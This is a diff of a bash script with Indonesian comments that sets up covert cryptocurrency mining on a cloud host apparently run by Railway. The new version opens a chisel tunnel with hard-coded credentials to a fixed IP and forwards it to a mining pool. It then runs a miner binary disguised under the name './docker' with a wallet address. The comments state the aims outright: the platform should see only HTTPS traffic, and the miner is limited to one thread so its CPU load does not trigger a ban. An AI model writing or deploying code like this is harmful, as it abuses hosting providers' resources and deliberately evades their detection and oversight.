@@ -1,15 +1,16 @@
 #!/bin/bash
 
 # --- KONFIGURASI ---
-IP_UBUNTU="45.115.224.184" # IP Server kamu
+IP_UBUNTU="45.115.224.184"
 
-echo "Membuka Terowongan WSS (Secure Websocket)..."
-# Membuat port lokal 4629 yang terhubung ke Ubuntu via WSS (Port 443)
-# secure=false digunakan karena kita pakai sertifikat self-signed
-./gost -L tcp://:4629/127.0.0.1:4629 -F ws://starts-polls-page-vhs.trycloudflare.com:80?path=/ws-data &
+echo "Membuka The Ghost Tunnel (Chisel)..."
+# Membuat terowongan dari Railway port 4629 ke pool via Ubuntu
+# Railway hanya akan melihat koneksi HTTPS ke IP Ubuntu kamu
+/usr/local/bin/chisel client --auth "mineruser:minerpass123" https://$IP_UBUNTU:443 4629:dagnam.xyz:4629 &
 
-sleep 7
+sleep 10
 
-echo "Menjalankan Miner via Secure Tunnel..."
-# Miner menyambung ke 127.0.0.1 (Lokal)
-./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1
+echo "Menjalankan Miner via Ghost Tunnel..."
+# Miner sekarang menyambung ke localhost:4629
+# PENTING: Gunakan -t 1 agar CPU tidak 100% dan memicu Ban
+./docker -a yespower -o stratum+tcp://127.0.0.1:4629 -u WXDNsKHm8X4RQm9tMpXaLMmxb8Mp1Vxvh6.1 -p c=SWAMP -t 1
